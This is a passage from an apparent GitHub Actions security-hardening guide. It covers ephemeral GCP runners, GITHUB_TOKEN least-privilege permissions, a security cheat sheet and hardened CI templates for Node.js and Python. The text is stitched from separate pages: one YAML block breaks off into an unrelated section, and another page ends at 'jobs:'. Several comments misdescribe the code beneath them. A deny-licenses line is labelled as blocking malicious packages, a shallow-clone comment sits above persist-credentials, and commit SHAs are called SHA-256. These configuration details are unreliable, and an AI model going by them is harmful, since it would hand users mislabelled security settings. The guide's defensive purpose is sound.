  --project="${PROJECT_ID}" \
  --base-instance-name=runner \
  --template="${TEMPLATE_NAME}" \
  --size=0 \
  --zone="${ZONE}"

### Configure autoscaling based on job queue
gcloud compute instance-groups managed set-autoscaling github-runners-ephemeral \
  --project="${PROJECT_ID}" \
  --zone="${ZONE}" \
  --min-num-replicas=0 \
  --max-num-replicas=10 \
  --cool-down-period=60 \
  --mode=on \
  --scale-based-on-cpu \
  --target-cpu-utilization=0.6
```

###### VM Startup Script

```bash
#!/bin/bash
### /opt/runner-orchestrator/vm-startup.sh
### GCP VM startup script for ephemeral runner

set -euo pipefail

echo "==> Configuring ephemeral runner VM"

### Install runner
mkdir -p /opt/actions-runner && cd /opt/actions-runner
curl -o actions-runner-linux-x64-2.311.0.tar.gz \
  -L https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz
tar xzf actions-runner-linux-x64-2.311.0.tar.gz
rm actions-runner-linux-x64-2.311.0.tar.gz

### Fetch registration token from Secret Manager
RUNNER_TOKEN=$(gcloud secrets versions access latest --secret=github-runner-token)
RUNNER_NAME="vm-ephemeral-$(hostname)-$(date +%s)"
RUNNER_LABELS="self-hosted,ephemeral,vm,gcp"

### Register runner (ephemeral mode)
./config.sh \
  --url https://github.com/my-org/my-repo \
  --token "${RUNNER_TOKEN}" \
  --name "${RUNNER_NAME}" \
  --labels "${RUNNER_LABELS}" \
  --ephemeral \
  --unattended

### Run single job
./run.sh

### Self-destruct after job completion
echo "==> Job complete, destroying VM"
gcloud compute instances delete "$(hostname)" --zone="$(gcloud compute instances list --filter="name=$(hostname)" --format="value(zone)")" --quiet
```

##### Packer VM Image for Hardened Runners

Pre-baked VM image with security hardening applied.

```json
{
  "builders": [
    {
      "type": "googlecompute",
      "project_id": "my-gcp-project",
      "source_image_family": "ubuntu-2204-lts",
      "zone": "us-central1-a",
      "image_name": "github-runner-hardened-{{timestamp}}",
      "image_family": "github-runner-hardened",
      "ssh_username": "packer",
      "machine_type": "e2-medium",
      "disk_size": 20
    }
  ],
  "provisioners": [
    {
      "type": "shell",
      "script": "scripts/hardening/os-baseline.sh"
    },
    {
      "type": "shell",
      "script": "scripts/hardening/cis-benchmarks.sh"
    },
    {
      "type": "shell",
      "script": "scripts/hardening/firewall-rules.sh"
    },
    {
      "type": "shell",
      "script": "scripts/install-runner.sh"
    },
    {
      "type": "shell",
      "inline": [
        "echo 'Hardened runner image build complete'",
        "echo 'Image includes: OS hardening, firewall, audit logging, runner software'",
        "echo 'Startup script will configure ephemeral mode at boot'"
      ]
    }
  ]
}
```

#### Actions Runner Controller (ARC) Patterns

Kubernetes-native runner orchestration with pod-level isolation.

##### ARC Installation

Deploy ARC controller to Kubernetes cluster.

```yaml
### arc-controller-install.yml
### Install Actions Runner Controller using Helm

### GITHUB_TOKEN Permissions Overview

Lock down workflow permissions. The GITHUB_TOKEN grants access to repository resources. Default permissions give too much. Explicit minimal permissions prevent privilege escalation.

> **The Risk**
>
>
> Default `permissions: write-all` grants workflows the ability to push code, modify releases, create issues, and access packages. A compromised workflow or script injection can weaponize these permissions for persistent access.
>

#### What is GITHUB_TOKEN?

GitHub automatically creates a unique `GITHUB_TOKEN` secret for each workflow run. This token authenticates the workflow to the GitHub API with repository-scoped permissions.

**Token Lifecycle**:

1. GitHub generates token when workflow job starts
2. Token available via `${{ secrets.GITHUB_TOKEN }}` or `${{ github.token }}`
3. Token expires when job completes
4. Token scope limited to repository where workflow runs

**Key Characteristics**:

- **Automatic**: No manual secret creation required
- **Ephemeral**: Lives only for duration of job
- **Repository-scoped**: Cannot access other repositories (except with special configuration)
- **Configurable**: Permissions can be restricted per workflow or per job

#### The Permission Problem

```mermaid
flowchart TD
    A["Workflow Starts"] --> B{"Permissions<br/>Specified?"}

    B -->|No - Uses Default| C["Default Permissions"]
    B -->|Yes - Explicit| D["Explicit Permissions"]

    C --> C1["Read/Write Access"]
    C --> C2["contents: write"]
    C --> C3["issues: write"]
    C --> C4["pull-requests: write"]
    C --> C5["packages: write"]

    D --> D1["Minimal Scope"]
    D --> D2["contents: read"]
    D --> D3["Only What's Needed"]

    C1 --> E["Attack Surface: High"]
    D1 --> F["Attack Surface: Low"]

    E --> G["Script injection can:<br/>- Push malicious code<br/>- Create releases<br/>- Modify workflows"]
    F --> H["Script injection limited to:<br/>- Read repository<br/>- No persistence"]

    %% Ghostty Hardcore Theme
    style A fill:#66d9ef,color:#1b1d1e
    style B fill:#e6db74,color:#1b1d1e
    style C fill:#f92572,color:#1b1d1e
    style D fill:#a6e22e,color:#1b1d1e
    style E fill:#f92572,color:#1b1d1e
    style F fill:#a6e22e,color:#1b1d1e
    style G fill:#fd971e,color:#1b1d1e
    style H fill:#66d9ef,color:#1b1d1e

```

#### Default Permissions

GitHub's default permissions vary based on repository settings and organization policies.

##### Repository-Level Defaults

Navigate to repository Settings → Actions → General → Workflow permissions.

Three options available:

###### Option 1: Read and Write Permissions (Default)

```yaml
### Implicit default - NO permissions block specified
name: CI
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: echo "Token has broad write access"
```

**Grants**:

- `contents: write`
- `metadata: read`
- `issues: write`
- `pull-requests: write`
- `statuses: write`

**Risk**: Workflow can modify code, create releases, open issues. Script injection becomes code execution with persistence.

###### Option 2: Read Permissions Only

```yaml
### Org/repo configured for read-only defaults
### Still implicit - no permissions block needed
name: CI
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: echo "Token has read-only access"
```

**Grants**:

- `contents: read`
- `metadata: read`

**Better**: Reduces attack surface, but still relies on implicit configuration.

###### Option 3: Explicit Permissions (Recommended)

```yaml
### Explicit permissions - ALWAYS SPECIFY
name: CI
on: [push]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: echo "Token has explicitly scoped access"
```

**Grants**: Only what you specify. No reliance on repository configuration.

**Best Practice**: Always use explicit permissions. Never rely on defaults.

#### Least Privilege Principle

Grant workflows the minimum permissions required to complete their task. Nothing more.

##### Why Least Privilege Matters

**Without Least Privilege**: Compromised action with default `contents: write` can push backdoors to `.github/workflows/`, establishing persistent access.

**With Least Privilege**: Workflow with `permissions: { contents: read }` blocks write attempts. Push fails with "Resource not accessible by integration". Attack contained.

##### Implementing Least Privilege

Start with minimal permissions, add only what's needed:

```yaml
### Step 1: Start minimal
permissions:
  contents: read

### Step 2: Add permissions as errors occur
permissions:
  contents: read        # Checkout code
  pull-requests: write  # Post test results as comment
```

#### Complete Permissions Matrix

All available GITHUB_TOKEN permissions with scope definitions.

| Permission | Read Scope | Write Scope |
| ---------- | ---------- | ----------- |
| **actions** | View workflow runs and artifacts | Cancel, re-run, delete workflow runs |
| **attestations** | View attestations | Create attestations for artifacts |
| **checks** | View check runs | Create, update check runs (status checks) |
| **contents** | Read repository files, commits, refs | Push commits, create tags, create releases |
| **deployments** | View deployment status | Create deployment statuses |
| **discussions** | Read discussions | Create, edit discussions |
| **id-token** | Request OIDC token | N/A (write enables OIDC token request) |
| **issues** | Read issues | Create, edit, close issues, add labels |
| **packages** | Download packages | Upload, delete packages |
| **pages** | View Pages builds | Deploy to GitHub Pages |
| **pull-requests** | Read PRs and reviews | Create, edit PRs, request reviewers, merge |
| **repository-projects** | Read projects (classic) | Create, edit projects |
| **security-events** | View code scanning alerts | Upload SARIF files to Security tab |
| **statuses** | View commit statuses | Create commit statuses |

##### Metadata Permission

**Special Case**: `metadata: read` is always granted. Cannot be modified. Allows access to repository metadata like name, description, topics.

#### Default vs Explicit Permissions Comparison

| Aspect | Default Permissions | Explicit Permissions |
| ------ | ------------------- | -------------------- |
| **Configuration** | Inherited from repo/org settings | Declared in workflow file |
| **Portability** | Breaks when repo settings change | Works consistently across repos |
| **Visibility** | Hidden - must check repo settings | Visible in workflow file |
| **Security Posture** | Varies by configuration | Consistently minimal |
| **Attack Surface** | Often excessive | Minimized to requirements |
| **Maintenance** | Relies on external policy | Self-documenting in code |
| **Best Practice** | Avoid | Always use |

#### Read vs Write Scope Explained

##### Read Scope

**Enables**:

- GET requests to GitHub API
- Viewing repository data
- Downloading artifacts and packages

**Cannot**:

- Modify repository
- Create resources
- Delete data

**Example**: CI workflow that only tests code

```yaml
permissions:
  contents: read  # Checkout code for testing
```

##### Write Scope

**Enables**:

- POST, PATCH, PUT, DELETE requests to GitHub API
- Creating and modifying resources
- Pushing code, creating releases, posting comments

**Requires Justification**: Every write permission must have a documented reason.

**Example**: Release workflow that creates GitHub release

```yaml
permissions:
  contents: write  # Create release and upload assets
```

##### Permission Escalation Risk

`contents: write` allows workflows to modify themselves, enabling persistent backdoors. Prefer `contents: read` with `pull-requests: write` for commenting without repository modification.

#### Workflow-Level vs Job-Level Permissions

##### Workflow-Level Permissions

Applied to all jobs unless overridden at job level.

```yaml
permissions:
  contents: read

jobs:
  test:
##    # Inherits contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: npm test
```

##### Job-Level Permissions

Override workflow-level for specific jobs requiring additional permissions.

```yaml
permissions:
  contents: read  # Default

jobs:
  comment:
    permissions:
      contents: read
      pull-requests: write  # Escalate for this job only
    runs-on: ubuntu-latest
    steps:
      - run: gh pr comment ${{ github.event.number }} --body "Tests passed"
```

**Best Practice**: Default to minimal workflow-level permissions, escalate only for specific jobs.

#### Common Permission Patterns

| Pattern | Permissions | Use Case |
| ------- | ----------- | -------- |
| **Read-Only CI** | `contents: read` | Test, lint, build |
| **PR Comment** | `contents: read`, `pull-requests: write` | Post coverage, scan results |
| **Security Scan** | `contents: read`, `security-events: write` | Upload SARIF to Security tab |
| **Release** | `contents: write` | Create releases, push tags |
| **OIDC Federation** | `id-token: write`, `contents: read` | Cloud auth without secrets |
| **Package Publish** | `contents: read`, `packages: write` | Publish to GitHub Packages |

#### Troubleshooting Permission Errors

**"Resource not accessible by integration"**: Add missing permission to `permissions` block.

**"Must have admin access to organization"**: Use GitHub App with org-level permissions instead of GITHUB_TOKEN.

**Token works locally but fails in Actions**: Personal tokens have broader scope than GITHUB_TOKEN. Adjust workflow permissions or use GitHub App.

#### Security Best Practices

**Always use explicit permissions**: Never rely on repository defaults.

```yaml
permissions:
  contents: read
```

**Scope to job when possible**: Escalate only where needed.

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write
```

**Document permissions**: Add comments explaining why each permission is required.

**Avoid `contents: write`**: Enables workflow self-modification. Use pull requests for changes when possible.

**Use OIDC instead of secrets**: Prefer `id-token: write` for cloud authentication over long-lived credentials.

**Review permission escalations**: Require security review for `.github/workflows/` changes that add permissions.

#### Next Steps

Ready to implement minimal permissions? Continue with:

- **[Permission Templates](templates.md)**: Copy-paste templates for common workflow types (CI, release, deployment, security scanning)
- **[Job-Level Scoping](job-scoping.md)**: Advanced patterns for multi-job workflows with different permission requirements
- **[Complete Examples](../examples/index.md)**: Production workflows demonstrating all security patterns

#### Quick Reference

| Workflow Type | Required Permissions | Notes |
| ------------- | -------------------- | ----- |
| **CI/Test** | `contents: read` | Basic testing, no modifications |
| **PR Comment** | `contents: read`, `pull-requests: write` | Post results to PR |
| **Security Scan** | `contents: read`, `security-events: write` | Upload SARIF to Security tab |
| **Release** | `contents: write` | Create release, push tags |
| **Deploy (OIDC)** | `id-token: write`, `contents: read` | Cloud deployment without secrets |
| **Package Publish** | `contents: read`, `packages: write` | Publish to GitHub Packages |
| **GitHub Pages** | `contents: read`, `pages: write` | Deploy to Pages |

---

> **Start Minimal, Escalate as Needed**
>
>
> Begin with `permissions: { contents: read }` for every workflow. Add permissions only when you encounter "Resource not accessible" errors. Document why each permission is required.
>

### GitHub Actions Security Cheat Sheet

One-page security reference for hardening GitHub Actions workflows. Copy-paste ready patterns for production use.

> **Start Here**
>
>
> New to GitHub Actions security? Start with SHA pinning and minimal permissions. Both provide high impact with minimal workflow changes.
>

#### Quick Security Checklist

Essential controls for every workflow:

- [ ] All actions pinned to full SHA-256 hashes with version comments
- [ ] Explicit minimal `permissions` block at workflow or job level
- [ ] OIDC federation for cloud access (no stored credentials)
- [ ] `pull_request` trigger for untrusted code (not `pull_request_target`)
- [ ] Input validation for any `github.event.*` values used in shell
- [ ] Secret scanning enabled with push protection
- [ ] Self-hosted runners use ephemeral patterns
- [ ] Environment protection for production deployments
- [ ] Dependabot enabled for automated action updates

#### Action Pinning

Pin actions to immutable SHA-256 commits. Tags are mutable and vulnerable.

##### SHA Pinning Pattern

```yaml
steps:
##  # ✅ GOOD: SHA pinned with version comment
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  - uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1

##  # ❌ BAD: Mutable tag reference
##  # - uses: actions/checkout@v4
```

##### Comment Formats

| Format | Example | Use Case |
| ------ | ------- | -------- |
| **Standard** | `# v4.1.1` | Most workflows |
| **Extended** | `# v4.1.1 (2023-11-15)` | Track update dates |
| **Date-based** | `# v4.1.1 @ 2023-11-15` | Compliance tracking |

##### Common Actions Reference

| Action | Latest SHA (v4.1.1 / v3.8.1) | Trust Tier |
| ------ | ---------------------------- | ---------- |
| `actions/checkout` | `b4ffde65f46336ab88eb53be808477a3936bae11` | Tier 1 (GitHub) |
| `actions/setup-node` | `5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d` | Tier 1 (GitHub) |
| `actions/cache` | `13aacd865c20de90d75de3b17ebe84f7a17d57d2` | Tier 1 (GitHub) |
| `actions/upload-artifact` | `26f96dfa697d77e81fd5907df203aa23a56210a8` | Tier 1 (GitHub) |
| `github/codeql-action/init` | `cdcdbb579706841c47f7063dda365e292e5cad7a` | Tier 1 (GitHub) |

[**See full pinning guide →**](../action-pinning/sha-pinning.md)

##### Dependabot Auto-Updates

`.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
##      # Group GitHub-maintained actions
      github-actions-core:
        patterns:
          - "actions/*"
          - "github/*"
```

[**See Dependabot guide →**](../action-pinning/dependabot.md)

#### GITHUB_TOKEN Permissions

Minimize token scope. Default `write-all` is dangerous.

##### Minimal Permissions Pattern

```yaml
name: Secure CI
on: [push, pull_request]

### Workflow-level: deny most access
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
##    # Job inherits workflow-level permissions
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: npm test

  publish:
    runs-on: ubuntu-latest
##    # Job-level: override for specific needs
    permissions:
      contents: read
      packages: write  # Only this job can publish
    steps:
      - run: npm publish
```

##### Permission Quick Reference

| Workflow Type | Required Permissions |
| ------------- | -------------------- |
| **CI/Test** | `contents: read` |
| **PR Comments** | `contents: read, pull-requests: write` |
| **Release** | `contents: write, packages: write` |
| **Deploy** | `id-token: write, contents: read` (OIDC) |
| **Security Scan** | `contents: read, security-events: write` |
| **GitHub Pages** | `contents: read, pages: write, id-token: write` |

##### Common Permissions

| Permission | Read | Write |
| ---------- | ---- | ----- |
| `contents` | Clone repo | Push commits, tags |
| `pull-requests` | Read PRs | Create/update PRs, comments |
| `issues` | Read issues | Create/modify issues |
| `packages` | Download packages | Publish packages |
| `id-token` | - | Request OIDC JWT (cloud auth) |
| `security-events` | - | Upload SARIF to Security tab |

[**See permissions guide →**](../token-permissions/index.md)

#### Secret Management

Eliminate long-lived credentials. Use OIDC federation.

##### OIDC Federation (Recommended)

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # Request OIDC token
      contents: read
    environment: production  # Restrict trust to environment
    steps:
##      # ✅ GOOD: No stored credentials
      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/github/providers/github'
          service_account: 'deploy@project.iam.gserviceaccount.com'

##      # ❌ BAD: Stored service account key
##      # - run: echo "${{ secrets.GCP_SA_KEY }}" | base64 -d > key.json
```

##### OIDC Subject Claim Patterns

| Pattern | Subject Claim | Trust Level |
| ------- | ------------- | ----------- |
| **Environment** | `repo:org/repo:environment:prod` | **Recommended** |
| **Branch** | `repo:org/repo:ref:refs/heads/main` | Medium |
| **Repository** | `repo:org/repo` | Broad (use with caution) |

[**See OIDC guide →**](../secrets/oidc/index.md)

##### Secret Rotation Schedule

| Credential Type | Rotation Frequency | Priority |
| --------------- | ------------------ | -------- |
| Production API keys | 30 days | Critical |
| CI/CD tokens | 60 days | High |
| Service account keys | 90 days (prefer OIDC) | High |
| Test environment | 180 days | Medium |
| Development tokens | 365 days | Low |

[**See rotation guide →**](../secrets/rotation/index.md)

##### Secret Scanning

Enable push protection to block credential commits.

Configuration path: `Settings → Code security → Secret scanning → Push protection → Enable`

```yaml
### .github/workflows/secret-scan.yml
name: Secret Scanning
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          fetch-depth: 0  # Full history for scanning

      - uses: gitleaks/gitleaks-action@cb7149a9a1d86f1c2e3ab90ae2f43a75ed56e95a  # v2.3.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

[**See scanning guide →**](../secrets/scanning/index.md)

#### Third-Party Actions

Evaluate before adopting. Not all actions are safe.

##### Trust Tiers

| Tier | Publisher | Verification | Risk | Pinning Required |
| ---- | --------- | ------------ | ---- | ---------------- |
| **1** | GitHub (`actions/*`, `github/*`) | Official | Low | SHA recommended |
| **2** | Verified publishers (blue checkmark) | Verified org | Medium | SHA required |
| **3** | Community (active maintenance) | None | High | SHA + source review |
| **4** | Unknown/unmaintained | None | Very High | Avoid or fork |

##### Action Evaluation Checklist

Before adding a third-party action:

- [ ] Check maintainer trustworthiness (organization, history, reputation)
- [ ] Review repository health (stars, forks, recent commits, open issues)
- [ ] Audit source code for suspicious patterns (secret exfiltration, network calls)
- [ ] Check security history (past vulnerabilities, incident response quality)
- [ ] Review permission requirements (does it need write access?)
- [ ] Verify maintenance activity (recent commits, responsive maintainers)
- [ ] Consider forking for critical workflows

[**See evaluation guide →**](../third-party-actions/evaluation.md)

##### Organization Allowlisting

GitHub Enterprise: `Organization Settings → Actions → General → Policies`

```yaml
### Example policy: Tier 1 + Tier 2 only
Allowed actions and reusable workflows:
  - Allow actions created by GitHub: ✅
  - Allow actions by Marketplace verified creators: ✅
  - Allow specified actions and reusable workflows:
      - aquasecurity/trivy-action@*
      - google-github-actions/*@*
```

[**See allowlisting guide →**](../third-party-actions/allowlisting.md)

#### Self-Hosted Runner Security

Never use persistent runners for untrusted code.

##### Deployment Models

| Model | Security | Complexity | Use Case |
| ----- | -------- | ---------- | -------- |
| **GitHub-hosted** | High | None | Public repos, low trust requirement |
| **Ephemeral containers** | High | Medium | Private repos, moderate isolation |
| **Ephemeral VMs** | Very High | High | Production, compliance requirements |
| **Persistent runners** | Low | Low | **Avoid for public repos** |

##### Ephemeral Runner Pattern

```bash
#!/bin/bash
### Podman ephemeral runner with strict isolation
podman run --rm \
  --security-opt=no-new-privileges:true \
  --cap-drop=ALL \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=1g \
  --network=slirp4netns:enable_ipv6=false \
  -e RUNNER_EPHEMERAL=true \
  -e GITHUB_TOKEN="${GITHUB_TOKEN}" \
  ghcr.io/myorg/runner:latest
```

[**See ephemeral patterns →**](../runners/ephemeral/index.md)

##### Runner Hardening Checklist

- [ ] Use ephemeral mode (VMs or containers destroyed after each job)
- [ ] Deny-by-default firewall (UFW, iptables) with GitHub API allow-list
- [ ] Block cloud metadata endpoints (169.254.169.254)
- [ ] Dedicated unprivileged user (no sudo, restricted shell)
- [ ] No stored credentials (OIDC federation only)
- [ ] Restrict runner group to private repositories only
- [ ] Enable audit logging (auditd, centralized collection)
- [ ] Automatic security updates (unattended-upgrades, yum-cron)

[**See hardening guide →**](../runners/hardening/index.md)

##### Runner Group Restrictions

Restrict sensitive runners to trusted repositories and workflows:

```bash
### Example: API-based runner group configuration
gh api --method PUT \
  /orgs/ORG/actions/runner-groups/GROUP_ID \
  -f name='production-runners' \
  -f visibility='selected' \
  -F selected_repository_ids='[123,456]' \
  -f allows_public_repositories=false \
  -f restricted_to_workflows=true \
  -F selected_workflows='[".github/workflows/deploy.yml@refs/heads/main"]'
```

[**See runner groups →**](../runners/groups/index.md)

#### Workflow Triggers

Choose triggers carefully. `pull_request_target` is dangerous.

##### Trigger Security Comparison

| Trigger | Execution Context | GITHUB_TOKEN | Secrets | Fork PR Safety |
| ------- | ----------------- | ------------ | ------- | -------------- |
| **`pull_request`** | Fork PR branch | Read-only | ❌ Not exposed | ✅ Safe |
| **`pull_request_target`** | Base branch | Write | ✅ Exposed | ❌ **Dangerous** |
| **`workflow_run`** | Base branch | Write | ✅ Exposed | ✅ Safe (with validation) |
| **`push`** | Pushed branch | Write | ✅ Exposed | N/A |

##### Safe Fork PR Pattern

```yaml
### .github/workflows/ci.yml
name: CI
on:
  pull_request:  # Safe for untrusted code
    branches: [main]

permissions:
  contents: read  # Read-only access

jobs:

### Hardened CI Workflow

Copy-paste ready CI workflow templates with comprehensive security hardening. Each example demonstrates action pinning, minimal GITHUB_TOKEN permissions, input validation, and security scanning.

> **Complete Security Patterns**
>
>
> These workflows integrate all security patterns from the hub: SHA-pinned actions, job-level permissions, secret scanning prevention, fork PR safety, and security tooling. Use as production templates.
>

#### Universal CI Pattern

Core security controls that apply to all CI workflows regardless of language or tooling.

##### Security Principles Applied

Every example in this guide implements these controls:

1. **Action Pinning**: All third-party actions pinned to full SHA-256 commit hashes
2. **Minimal Permissions**: `contents: read` by default, elevated only for specific jobs
3. **Fork PR Safety**: `pull_request` trigger (not `pull_request_target`) for untrusted code
4. **Input Validation**: No direct injection of untrusted inputs into shell commands
5. **Secret Scanning**: Pre-commit hooks and push protection to prevent credential leaks
6. **Dependency Scanning**: Automated vulnerability detection for dependencies
7. **SARIF Upload**: Security findings uploaded to GitHub Security tab

##### Base Hardened CI Workflow

Minimal secure CI workflow demonstrating core patterns.

```yaml
name: Hardened CI
on:
  push:
    branches: [main, develop]
  pull_request:
##    # SECURITY: pull_request (not pull_request_target) runs untrusted code in isolated context
##    # Fork PRs run with read-only GITHUB_TOKEN and no access to secrets
    branches: [main, develop]

### SECURITY: Workflow-level permissions deny all by default
### Job-level permissions grant minimal access per job
permissions:
  contents: read

jobs:
##  # Job 1: Build and test with minimal permissions
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Read repository code
##      # No write permissions - prevents tampering
    steps:
##      # SECURITY: All actions pinned to full SHA-256 commit hashes
##      # Version comments (# vX.Y.Z) provide human readability
##      # Dependabot will update SHAs via PRs
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
##          # SECURITY: Shallow clone (depth: 1) reduces attack surface
##          # Full history not needed for CI builds
          persist-credentials: false  # Don't persist git credentials

      - name: Set up build environment
        uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1
        with:
          node-version: '20'
          cache: 'npm'  # Cache dependencies for speed

      - name: Install dependencies
        run: npm ci  # Use ci (not install) for reproducible builds

      - name: Run linter
        run: npm run lint

      - name: Run unit tests
        run: npm test -- --coverage

      - name: Upload coverage reports
        uses: codecov/codecov-action@e0b68c6749509c5f83f984dd99a76a1c1a231044  # v4.0.1
        with:
##          # SECURITY: Never use secrets in fork PRs
##          # Codecov token optional for public repos
          fail_ci_if_error: false  # Don't fail on upload errors
          files: ./coverage/coverage.xml
        env:
##          # SECURITY: Secrets not exposed to fork PRs with pull_request trigger
          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}

##  # Job 2: Security scanning with isolated permissions
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read       # Read repository code
      security-events: write  # Upload SARIF to Security tab
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: CodeQL for static analysis
      - name: Initialize CodeQL
        uses: github/codeql-action/init@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
          languages: javascript
##          # SECURITY: Use default query suite (security-extended for more coverage)
          queries: security-extended

      - name: Autobuild
        uses: github/codeql-action/autobuild@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
##          # SECURITY: Upload SARIF to Security tab (requires security-events: write)
          category: "/language:javascript"

##      # SECURITY: Trivy for dependency and vulnerability scanning
      - name: Run Trivy scanner
        uses: aquasecurity/trivy-action@d43c1f16c00cfd3978dde6c07f4bbcf9eb6993ca  # 0.16.1
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy results
        uses: github/codeql-action/upload-sarif@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
          sarif_file: 'trivy-results.sarif'
          category: 'trivy'

##  # Job 3: Build artifacts with minimal permissions
  build:
    runs-on: ubuntu-latest
##    # SECURITY: Only build on non-fork PRs and main branch
##    # Prevents malicious fork PRs from creating artifacts
    if: github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository
    permissions:
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

      - name: Set up build environment
        uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: Build application
        run: npm run build

      - name: Upload build artifacts
        uses: actions/upload-artifact@c7d193f32edcb7bfad88892161225aeda64e9392  # v4.0.0
        with:
          name: build-artifacts
          path: dist/
          retention-days: 7  # SECURITY: Short retention to reduce exposure
```

#### Language-Specific CI Workflows

##### Node.js / TypeScript CI

Hardened CI for Node.js and TypeScript projects with comprehensive testing and security scanning.

```yaml
name: Node.js CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    name: Test on Node ${{ matrix.node-version }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
    strategy:
##      # SECURITY: fail-fast prevents wasting resources on known failures
      fail-fast: true
      matrix:
        node-version: [18, 20]
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

      - uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

##      # SECURITY: Audit dependencies for known vulnerabilities
      - name: Audit dependencies
        run: npm audit --audit-level=high

      - name: Install dependencies
        run: npm ci

##      # SECURITY: Type checking catches bugs before runtime
      - name: Type check
        run: npm run type-check

      - name: Lint
        run: npm run lint

      - name: Run tests
        run: npm test -- --coverage --maxWorkers=2

      - name: Build
        run: npm run build

  dependency-review:
    name: Dependency Review
    runs-on: ubuntu-latest
##    # SECURITY: Only run on PRs to catch risky dependencies before merge
    if: github.event_name == 'pull_request'
    permissions:
      contents: read
      pull-requests: write  # Post review comments
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: Dependency review detects malicious or vulnerable packages in PRs
      - uses: actions/dependency-review-action@c74b580d73376b7750d3d2a50bfb8adc2c937507  # v3.1.0
        with:
##          # Fail on critical/high vulnerabilities
          fail-on-severity: high
##          # Deny known malicious packages
          deny-licenses: AGPL-3.0, GPL-3.0
```

##### Python CI

Hardened CI for Python projects with security scanning and dependency management.

```yaml
name: Python CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    name: Test on Python ${{ matrix.python-version }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
    strategy:
      fail-fast: true
      matrix:
        python-version: ['3.10', '3.11', '3.12']
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

      - uses: actions/setup-python@0a5c61591373683505ea898e09a3ea4f39ef2b9c  # v5.0.0
        with:
          python-version: ${{ matrix.python-version }}
          cache: 'pip'

##      # SECURITY: Install dependencies from locked requirements
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements-dev.txt

##      # SECURITY: Bandit scans for common security issues in Python code
      - name: Run Bandit security scan
        run: |
          pip install bandit[toml]
          bandit -r . -f json -o bandit-report.json || true

##      # SECURITY: Safety checks for known vulnerabilities in dependencies
      - name: Check dependencies with Safety
        run: |
          pip install safety
          safety check --json

      - name: Lint with ruff
        run: |
          pip install ruff
          ruff check .

      - name: Type check with mypy
        run: |
          pip install mypy
          mypy .

      - name: Run tests with pytest
        run: |
          pip install pytest pytest-cov
          pytest --cov=. --cov-report=xml --cov-report=term

      - name: Upload coverage
        uses: codecov/codecov-action@e0b68c6749509c5f83f984dd99a76a1c1a231044  # v4.0.1
        with:
